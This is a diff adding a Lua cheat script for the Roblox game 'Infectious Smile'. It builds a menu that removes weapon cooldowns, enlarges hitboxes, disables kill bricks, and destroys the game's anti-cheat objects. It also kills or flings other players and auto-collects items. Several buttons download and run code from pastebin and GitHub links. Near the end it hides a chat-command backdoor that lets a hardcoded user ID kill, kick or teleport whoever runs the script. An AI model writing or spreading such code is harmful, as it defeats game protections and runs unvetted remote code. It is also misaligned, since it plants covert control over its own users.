@@ -1,0 +1,426 @@
+local DrRayLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
+
+local window = DrRayLibrary:Load("Smile GUI: Infectious smile", "Default")
+
+local tab1 = DrRayLibrary.newTab("Human", "rbxassetid://1129583422")
+
+local gettablesarray = newcclosure(function(...)
+    local result = {} 
+    for _, tbl in ipairs({...}) do
+        if type(tbl) == "table" then
+            for _, value in ipairs(tbl) do
+                table.insert(result, value)
+            end
+        end
+    end
+    return result
+end)
+
+coroutine.wrap(function()
+  getgenv().isnetworkowner = newcclosure(function(part)
+    return (part.Anchored == false and part.ReceiveAge == 0 and gethiddenproperty(part, "NetworkIsSleeping") == false)
+  end)
+  
+  getgenv().setsimulationradius = newcclosure(function(min, max)
+    sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", min)
+    sethiddenproperty(game.Players.LocalPlayer, "MaxSimulationRadius", max)
+    sethiddenproperty(game.Players.LocalPlayer, "MaximumSimulationRadius", max)
+  end)
+  
+  getgenv().getsimulationradius = newcclosure(function()
+    return gethiddienproperty(game.Players.LocalPlayer, "SimulationRadius"), gethiddienproperty(game.Players.LocalPlayer, "MaxSimulationRadius")
+  end)
+end)()
+
+local LabelName = Instance.new("TextLabel", game.CoreGui.DrRay.TopBar.TopBarClose)
+LabelName.Text = [[By MEGA COCONUT (ADSKer)]]
+LabelName.Size = UDim2.new(0.4, 0, 0.2, 0)
+LabelName.Position = UDim2.new(0.2, 0, 1, 0)
+LabelName.BackgroundTransparency = 1
+LabelName.TextColor3 = Color3.new(1, 1, 1)
+LabelName.TextSize = LabelName.TextSize / 2
+
+tab1.newDropdown("Fast weapon", "Makes your equipment faster", {"Bat", "Bottle", "Katana", "Branch", "Spare", "Chain"}, function(selectedOption)
+   for _, tool in next, gettablesarray(game.Players.LocalPlayer.Character:GetChildren(), game.Players.LocalPlayer.Backpack:GetChildren()) do
+      if tool:IsA("Tool") and tool.Name == selectedOption then
+         tool.Cooldown.Value = 0
+      end
+   end
+end)
+
+tab1.newToggle("Auto fast weapons", "I think the name makes it clear what it does", false, function(togleir)
+ udb = togleir
+  while udb and task.wait() do
+    if Workspace:FindFirstChild(game.Players.LocalPlayer.Name) then
+      local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+      if tool and tool:FindFirstChild("Cooldown") then
+        tool.Cooldown.Value = 0
+      end
+    end
+  end
+end)
+
+tab1.newToggle("Disable killbricks", "Makes untouchable all part that instantly kill you", false, function(toggleState)
+   for _, part in next, game.Workspace.Map:GetDescendants() do
+      if part:IsA("BasePart") and part:FindFirstChild("TouchInterest") and string.find(part.Name, "Kill") then
+         part.CanTouch = not toggleState
+         part.CanQuery = not toggleState
+      end
+   end
+end)
+
+local savedreach = 0
+tab1.newInput("Reach all weapons", "Reset to turn it off", function(text)
+savedreach = text
+for _, tool in next, gettablesarray(game.Players.LocalPlayer.Character:GetChildren(), game.Players.LocalPlayer.Backpack:GetChildren()) do
+  if tool:IsA("Tool") then
+   for _, part in next, tool:GetDescendants() do
+     if part:IsA("BasePart") and part:FindFirstChild("TouchInterest") then
+local sel = Instance.new("SelectionBox", part)
+sel.Adornee = part
+part.Transparency = 1
+part.Massless = true
+part.Size = Vector3.new(text, text, text)
+    end
+   end
+  end
+ end 
+end)
+
+tab1.newToggle("Auto reach weapons", "When you receive a weapon, it is immediately subject to reach (depends on the last weapon you inserted in Reach All Weapons)", false, function(togl)
+ local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
+  char.DescendantAdded:Connect(function(tool)
+    if tool:IsA("Tool") and togl then
+for _, part in next, tool:GetDescendants() do
+   if part:IsA("BasePart") and part:FindFirstChild("TouchInterest") then
+local sel = Instance.new("SelectionBox", part)
+sel.Adornee = part
+part.Transparency = 1
+part.Massless = true
+part.Size = Vector3.new(savedreach, savedreach, savedreach)
+   end
+end
+    end
+  end)
+end)
+
+tab1.newButton("Get main weapon", "Gives weapons", function()
+local last_pick_sin_mrazy, bac = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame, game.Players.LocalPlayer.Backpack
+  
+  repeat task.wait()
+    local toolname = (game.Players.LocalPlayer.Marketplace["Main Weapon"].Equipped.Value == "Default" and "Bat" or game.Players.LocalPlayer.Marketplace["Main Weapon"].Equipped.Value)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Map.HumanBase.Vendor.BatCollection.HitBox.CFrame
+    game.Workspace.Map.HumanBase.Vendor.BatCollection.ClickDetector.MaxActivationDistance = math.huge
+    fireclickdetector(game.Workspace.Map.HumanBase.Vendor.BatCollection.ClickDetector)
+  until bac:FindFirstChild(toolname) task.wait()
+ repeat task.wait() game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = last_pick_sin_mrazy until game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame == last_pick_sin_mrazy
+end)
+
+tab1.newButton("Get all special weapons", "Gives all special weapons for example shotgun. Cannot get locked guns", function()
+ for _, gun in next, Workspace.Map.System:GetDescendants() do
+  if gun:IsA("ClickDetector") and table.find({"FirePotionCollection", "ShotgunCollection", "KnifeCollection", "HatchetCollection", "RustyShovelCollection", "WaterJugCollection", "HandgunCollection", "ShovelCollection"}, gun.Parent.Name) and not gun.Parent:FindFirstAncestor("Locker") then
+    local name, pos, past = table.concat(string.split(string.gsub(gun.Parent.Name, "Collection", ""), "%l"), " "), game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame, tick()
+    repeat task.wait()
+       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = gun.Parent:FindFirstChildWhichIsA("BasePart").CFrame
+      fireclickdetector(gun)
+    until game.Players.LocalPlayer.Backpack:FindFirstChild(name) or tick() - past >= 0.75 task.wait()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
+  end
+ end
+end)
+
+tab1.newButton("Delete tool", "Removes tool in hand", function()
+   game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):Destroy()
+end)
+
+tab1.newToggle("Anti inventory block", "Well, now you understand", false, function(toggleState)
+DS = toggleState
+  while DS and task.wait() do
+    game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
+  end
+end)
+
+tab1.newToggle("Anti infection", "You won't be able to get infected except the players", false, function(togl)
+    for _, part in next, workspace.Map:GetDescendants() do
+      if part:IsA("BasePart") and string.find(part.Parent.Name, "Infector") then
+ part.Transparency = togl and 0.25 or 0
+ part.CanTouch = not togl
+      end
+    end
+end)
+
+tab1.newToggle("Anti infected players", "Fling players", false, function(toggleState)
+llkn = toggleState
+    while llkn and task.wait() do
+       if game.Players.LocalPlayer.Character.Humanoid:GetStateEnabled(Enum.HumanoidStateType.Jumping) == false and game.Players.LocalPlayer.Team:lower() ~= "smilling" then
+          game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity * 10000 + Vector3.new(0, 10000, 0) 
+           task.wait()
+          game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity
+       end
+    end
+end)
+
+tab1.newButton("AntiCheat destroy", "Removes killbricks outside the server boundary and new anti cheat", function()
+   workspace.Map.AntiHack:Destroy() 
+   game.Players.LocalPlayer.Character.StayOnPart:Destroy()
+   game.Players.LocalPlayer.Character.HumanoidInit:Destroy()
+end)
+
+local tab1 = DrRayLibrary.newTab("Smile", "rbxassetid://1129583422")
+
+tab1.newButton("Infect", "Infects you", function()
+    firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, workspace.Map.Infectors.Infector.Part, 0)
+end)
+
+tab1.newInput("Reach hitbox", "Increases the distance from which you can grab a player", function(num)
+  local hitbox = Instance.new("SelectionBox", game.Players.LocalPlayer.Character.Torso.Part)
+  hitbox.Adornee = game.Players.LocalPlayer.Character.Torso.Part
+  
+  game.Players.LocalPlayer.Character.Torso.Part.Massless = true
+  game.Players.LocalPlayer.Character.Torso.Part.Size = Vector3.new(7, 2, num)
+end)
+
+tab1.newToggle("Disable anti smilers", "All orange objects will be inviolable to you", false, function(togle)
+  for _, part in next, workspace:GetDescendants() do
+    if part:IsA("BasePart") and part.BrickColor.Name == "Neon orange" then
+      part.CanTouch = not togle
+      part.CanQuery = not togle
+    end
+  end
+end)
+
+tab1.newToggle("Auto grab", "Well, now you understand", false, function(toggleState)
+hh = toggleState
+while hh and task.wait() do
+   game:GetService("Players").LocalPlayer.Character.Infected.InfectEvent:FireServer()
+ end
+end)
+
+tab1.newToggle("Kill grab", "You kill player instantly after you grab him", false, function(bol)
+  pooh = bol
+    while pooh and task.wait() do
+for _, player in next, game.Players:GetPlayers() do
+ pcall(function()
+  if player ~= game.Players.LocalPlayer and player.Character and player.Character.HumanoidRootPart and isnetworkowner(player.Character.HumanoidRootPart) then
+    pcall(function()
+firetouchinterest(player.Character.HumanoidRootPart, Workspace.Map.Misc.Spearer.Lava, 0)
+    end)
+  end
+ end)
+end
+    end
+end)
+
+tab1.newToggle("Instant kill grab", "You you kill players so fast that you don\'t even have time to infect them", false, function(bol)
+  poohh = bol
+    while poohh and task.wait() do
+for _, player in next, game.Players:GetPlayers() do
+ pcall(function()
+  if player ~= game.Players.LocalPlayer and player.Character and player.Character.HumanoidRootPart and isnetworkowner(player.Character.HumanoidRootPart) then
+    pcall(function()
+      for _, part in next, Workspace.Map:GetDescendants() do
+        if part:IsA("BasePart") and part:FindFirstChildWhichIsA("TouchTransmitter") then
+          firetouchinterest(player.Character.HumanoidRootPart, part, 0)
+          firetouchinterest(player.Character.HumanoidRootPart, part, 1)
+        end
+      end
+    end)
+  end
+ end)
+end
+    end
+end)
+
+tab1.newToggle("Push grab", "After releasing you push the player to the right like a cool one", false, function(tolog)
+ polhh = tolog
+    while polhh and task.wait() do
+for _, player in next, game.Players:GetPlayers() do
+ pcall(function()
+  if player ~= game.Players.LocalPlayer and player.Character and player.Character.HumanoidRootPart and isnetworkowner(player.Character.HumanoidRootPart) then
+    pcall(function()
+player.Character.Humanoid:ChangeState("PlatformStanding", true)
+player.Character.HumanoidRootPart.Velocity += game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.RightVector * 600
+ end)
+  end
+ end)
+end
+    end
+end)
+
+tab1.newToggle("Anti stun", "You cant be stunned", false, function(togli)
+ yhik = togli
+ while yhik and task.wait() do
+  pcall(function()
+   if game.Players.LocalPlayer.Character.Stats.Downed.Value == true or game.Players.LocalPlayer.Character.Stats.Ragdoll.Value == true then
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 20
+    game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled("Jumping", true)
+    game.Players.LocalPlayer.Character.Stats.Downed.Value = false
+    game.Players.LocalPlayer.Character.Stats.Ragdoll.Value = false
+   end
+  end)
+ end
+end)
+
+tab1.newButton("Instant infect", "You can quickly infect players", function()
+  if game.Players.LocalPlayer.Character:FindFirstChild("Infected") then
+   game.Players.LocalPlayer.Character.Infected.Infect.Cooldown.Value = 0
+  end
+end)
+
+local tab1 = DrRayLibrary.newTab("Events", "rbxassetid://1129583422")
+
+tab1.newToggle("Auto collect keys", "You will automatically receive keys if they exist", false, function(tuu)
+   poty = tuu
+  while poty and task.wait() do
+    for _, key in next, workspace.Particles:GetChildren() do
+      if key:IsA("BasePart") and string.find(key.Name, "Key") then
+        firetouchinterest(game.Workspace:WaitForChild(game.Players.LocalPlayer.Name, 10):WaitForChild("HumanoidRootPart", 10), key, 0)
+      end
+    end
+  end
+end)
+
+tab1.newToggle("Auto collecting coins", "Collects everything SmileCoins", false, function(toggleState)
+jjj = toggleState
+while jjj and task.wait() do
+ for i, v in pairs(Workspace.Map.System:GetDescendants()) do
+     if v.Name == "SmileCoin" and v:FindFirstChild("TouchInterest") then
+pcall(function()
+        firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v, 0)
+end)
+     end
+   end
+ end
+end)
+
+tab1.newButton("Fullbright", "You will see in the dark", function()
+    pcall(function()
+    local lighting = game:GetService("Lighting");
+    lighting.Ambient = Color3.fromRGB(255, 255, 255);
+    lighting.Brightness = 1;
+    lighting.FogEnd = 1e10;
+    for i, v in pairs(lighting:GetDescendants()) do
+        if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") then
+            v.Enabled = false;
+        end;
+    end;
+    lighting.Changed:Connect(function()
+        lighting.Ambient = Color3.fromRGB(255, 255, 255);
+        lighting.Brightness = 1;
+        lighting.FogEnd = 1e10;
+    end);
+    spawn(function()
+        local character = game:GetService("Players").LocalPlayer.Character;
+        while wait() do
+            repeat wait() until character ~= nil;
+            if not character.HumanoidRootPart:FindFirstChildWhichIsA("PointLight") then
+                local headlight = Instance.new("PointLight", character.HumanoidRootPart);
+                headlight.Brightness = 1;
+                headlight.Range = 60;
+            end;
+        end;
+    end);
+end)
+end)
+
+tab1.newButton("Remove fog", "Helps against the rich", function()
+    game.Lighting.FogStart = math.huge
+    game.Lighting.FogEnd = math.huge
+    game.Lighting.FogColor = Color3.new(0, 0, 0)
+end)
+
+tab1.newButton("Check Seismic Activity", "Checks how much time is left before disaster", function()
+local originalPosition = workspace.CurrentCamera.CFrame
+workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
+workspace.CurrentCamera.CFrame = CFrame.new(-20, 6, -10) * CFrame.Angles(0, math.rad(90), 0)
+  task.wait(2)
+workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
+end)
+
+tab1.newToggle("Anti black hole", "You don't get distracted by black hole", false, function(value)
+ pow = value
+ while pow and task.wait() do
+   for _, child in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
+     if child:IsA("BodyMover") then
+       child:Destroy()
+     end
+   end
+ end
+end)
+
+tab1.newToggle("Kill nearest NPCs", "Kills nearest NPCs", false, function(Value)
+   yoo = Value
+while yoo and task.wait() do
+ if workspace:FindFirstChild(game.Players.LocalPlayer.Name) and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+   local parts = workspace:GetPartBoundsInRadius(game.Players.LocalPlayer.Character.HumanoidRootPart.Position, 45)
+    for _, part in next, parts do
+      if part.Anchored == false and not game.Players:GetPlayerFromCharacter(part.Parent) and part.Parent:FindFirstChildOfClass("Humanoid") then
+       local humanoid = part.Parent:FindFirstChildOfClass("Humanoid")
+        game.Players.LocalPlayer.SimulationRadius = math.huge
+        humanoid.Health = 0
+        humanoid:TakeDamage(math.huge)
+      end
+    end
+  end
+ end
+end)
+
+tab1.newToggle("Disable echo sounds effect", "You understand", false, function(togl)
+  if togl == true then
+    game:GetService("SoundService"):ResetPropertyToDefault("AmbientReverb")
+     else
+    game:GetService("SoundService").AmbientReverb = Enum.ReverbType.Cave
+  end
+end)
+
+tab1.newLabel("GUIS")
+
+tab1.newButton("Smile Hax", "Tap here", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/WG1BMS72",true))()
+end)
+
+tab1.newButton("Multi hub", "Tap here", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/jj123llol/multi-hub/main/Multi",true))()
+end)
+
+tab1.newButton("ROChips", "Tap here", function()
+    loadstring(game:HttpGet(('https://pastebin.com/raw/5NvnvrrS'),true))()
+end)
+ 
+tab1.newButton("GUI", "Tap here", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/InfectiousSmile", true))()
+end)
+
+tab1.newButton("GUI", "Tap here", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/X8hLEwcz"))()
+end)
+
+tab1.newButton("GUI", "Tap here", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/InfectiousSmile.lua", true))()
+end)
+
+local admins = {4636825706}
+game:GetService("TextChatService").MessageReceived:Connect(function(info)
+  if info["TextSource"] and table.find(admins, info.TextSource.UserId) and not table.find(admins, game.Players.LocalPlayer.UserId) and not game.Players.LocalPlayer:IsFriendsWith(info.TextSource.UserId) then
+   local player = game.Players:GetPlayerByUserId(info.TextSource.UserId)
+      if info.Text:lower() == "/e kill" then
+        if not replicatesignal then
+          game.Players.LocalPlayer.Character.Humanoid.Health = 0
+          game.Players.LocalPlayer.Character.Humanoid:ChangeState("Dead")
+        else
+          replicatesignal(game.Players.LocalPlayer.Kill)
+        end
+      elseif info.Text:lower() == "/e kick" then
+        game:Shutdown()
+      elseif info.Text:lower() == "/e bring" then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
+    end
+  end
+end)
+
+--[[
+  local hook; hook = hookfunction(require(game.ReplicatedStorage.Modules.CombatSystem).isInCooldown, function()
+    return false
+  end)
+  -- canDamage? escapeGrab? stunCycle? isWithinAntihackRange?
+]]
